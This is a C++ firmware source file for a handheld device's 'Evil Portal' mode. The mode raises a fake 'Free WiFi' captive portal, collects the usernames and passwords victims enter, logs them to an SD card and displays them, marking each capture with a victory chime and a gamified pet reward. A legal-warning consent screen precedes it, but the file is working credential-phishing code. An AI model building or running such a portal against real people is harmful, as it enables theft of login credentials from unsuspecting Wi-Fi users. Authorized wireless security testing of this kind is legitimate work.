// ============================================================
//  HeathenHawk Talon5 — modes/evil_portal.cpp
//  Captive portal via C6 co-processor
//  Credential display on 5" screen — authorized use only
// ============================================================
#include "../pins.h"
#include "../display/display_driver.h"
#include "../comms/comms_manager.h"
#include "../hawk/hawk_pet.h"
#include <Arduino.h>
#include <M5Unified.h>
#include <SD.h>

#define MODE_NAME "Evil Portal"
#define LOG_FILE  "/portal_creds.txt"
#define MAX_CREDS 50

struct Cred { char user[64]; char pass[64]; uint32_t ts; };
static Cred    creds[MAX_CREDS];
static uint8_t credCount  = 0;
static bool    sdReady    = false;
static bool    running    = false;
static bool    needRedraw = true;

void onPortalAlert(const char* msg, const char* detail) {
    if (credCount >= MAX_CREDS) return;
    strlcpy(creds[credCount].user, msg,    sizeof(creds[0].user));
    strlcpy(creds[credCount].pass, detail, sizeof(creds[0].pass));
    creds[credCount].ts = millis();
    credCount++;

    // Victory chime
    M5.Speaker.tone(1047, 100); delay(130);
    M5.Speaker.tone(1319, 100); delay(130);
    M5.Speaker.tone(1568, 150);

    // Log to SD
    if (sdReady) {
        File f = SD.open(LOG_FILE, FILE_APPEND);
        if (f) {
            f.printf("[%lu] user=%s  pass=%s\n", millis(), msg, detail);
            f.close();
        }
    }

    HawkPet::feed(FEED_EVIL_PORTAL, 1);
    needRedraw = true;
}

void renderPortal() {
    Display::clear(HH_DARK);
    Display::drawStatusBar(MODE_NAME, false, sdReady, false, 100);

    // Big capture counter
    Display::fillRect(0, 48, Display::width(), 120, HH_DARKCARD);
    Display::setTextColor(HH_PINK, HH_DARKCARD);
    Display::setTextSize(6.0f);
    Display::setCursor(40, 70);
    char buf[8]; snprintf(buf, sizeof(buf), "%d", credCount);
    Display::print(buf);
    Display::setTextColor(HH_GRAY, HH_DARKCARD);
    Display::setTextSize(1.5f);
    Display::setCursor(40, 148);
    Display::print("credentials captured");

    // Stop button
    uint32_t btnCol = running ? HH_CORAL : HH_PINK;
    Display::fillRoundRect(Display::width()-180, 60, 164, 44, 12, btnCol);
    Display::setTextColor(HH_WHITE, btnCol);
    Display::setTextSize(1.4f);
    Display::setCursor(Display::width()-168, 76);
    Display::print(running ? "■  Stop Portal" : "▶  Start Portal");

    // Credentials list
    if (credCount == 0) {
        Display::setTextColor(HH_GRAY, HH_DARK);
        Display::setTextSize(1.4f);
        Display::setCursor(40, Display::height()/2);
        Display::print("Waiting for connections...");
        Display::setCursor(40, Display::height()/2 + 35);
        Display::print("SSID: Free WiFi");
        return;
    }

    int32_t y = 178;
    int32_t rh = 80;
    for (uint8_t i = 0; i < credCount && y < Display::height()-40; i++) {
        Display::fillRoundRect(16, y, Display::width()-32, rh-4, 8, HH_DARKCARD);
        Display::drawRoundRect(16, y, Display::width()-32, rh-4, 8, HH_PINK);
        Display::setTextColor(HH_WHITE, HH_DARKCARD);
        Display::setTextSize(1.4f);
        Display::setCursor(32, y+12);
        Display::printf("user: %s", creds[i].user);
        Display::setCursor(32, y+38);
        Display::printf("pass: %s", creds[i].pass);
        y += rh;
    }
    needRedraw = false;
}

void mode_evil_portal() {
    credCount = 0; running = false; needRedraw = true;
    memset(creds, 0, sizeof(creds));
    sdReady = SD.begin();

    // Consent screen
    Display::clear(HH_DARK);
    Display::drawCard(40, 60, Display::width()-80, 480, "!! Legal Warning !!", HH_PINK);
    Display::setTextColor(HH_WHITE, HH_DARKCARD);
    Display::setTextSize(1.5f);
    Display::setCursor(60, 120);
    Display::print("Capturing credentials without");
    Display::setCursor(60, 155);
    Display::print("consent is ILLEGAL.");
    Display::setCursor(60, 195);
    Display::print("Only use against users who");
    Display::setCursor(60, 230);
    Display::print("have given written consent");
    Display::setCursor(60, 265);
    Display::print("for security testing.");

    Display::fillRoundRect(60, 330, Display::width()-120, 70, 16, HH_PINK);
    Display::setTextColor(HH_WHITE, HH_PINK);
    Display::setTextSize(1.6f);
    Display::setCursor(80, 355);
    Display::print("I have permission — Continue");

    Display::fillRoundRect(60, 420, Display::width()-120, 60, 16, HH_GRAY);
    Display::setTextColor(HH_WHITE, HH_GRAY);
    Display::setCursor(80, 440);
    Display::print("Cancel");

    while (true) {
        M5.update();
        auto evt = M5.Touch.getDetail();
        if (evt.wasPressed()) {
            if (evt.y >= 330 && evt.y <= 400) break;
            if (evt.y >= 420) return;
        }
        delay(30);
    }

    Comms::onAlert(onPortalAlert);
    renderPortal();

    while (true) {
        M5.update(); Comms::poll();
        auto evt = M5.Touch.getDetail();
        if (evt.wasPressed()) {
            if (evt.x < 30) break;
            if (evt.y >= 60 && evt.y <= 104 && evt.x >= Display::width()-180) {
                running = !running;
                if (running) Comms::startEvilPortal("Free WiFi");
                else Comms::stopAll();
                needRedraw = true;
            }
        }
        if (needRedraw) renderPortal();
        HawkPet::tick(); delay(16);
    }

    Comms::stopAll();
    Comms::onAlert(nullptr);
    char msg[32]; snprintf(msg, sizeof(msg), "%d captures", credCount);
    Display::showAlert("Portal Stopped", msg, HH_PINK, 2000);
}
